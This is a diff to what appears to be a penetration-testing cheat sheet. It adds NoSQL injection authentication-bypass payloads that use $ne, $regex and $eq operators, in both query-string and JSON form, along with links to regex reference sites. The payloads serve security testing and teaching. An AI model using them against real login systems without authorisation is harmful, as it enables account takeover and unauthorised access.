@@ -1057,13 +1057,19 @@ https://raw.githubusercontent.com/panch0r3d/nuclei-templates/master/header_sqli.
 https://raw.githubusercontent.com/ghsec/ghsec-jaeles-signatures/master/time-sqli.yaml
 
 ## NoSQL Injection (NoSQLI)
--> Auth bypass  
+-> Auth bypass
 ```
 username=test&password=test  
 username=admin&password[$ne]=abc  
 username=admin&password[$regex]=^.{6}$  
-username=admin&password[$regex]=^a.....  
+username=admin&password[$regex]=^a.....
+{"username": {"$regex": "admin"}, "password": {"$ne": ""} }
+{"username": {"$eq": "admin"}, "password": {"$ne": ""} }
+{"username": {"$ne": ""}, "password": {"$ne": ""} }
 ```
+-> regex
+https://quickref.me/regex
+https://regex101.com/
 
 ## Cross-Site Request Forgery (CSRF)
 ### Tricks
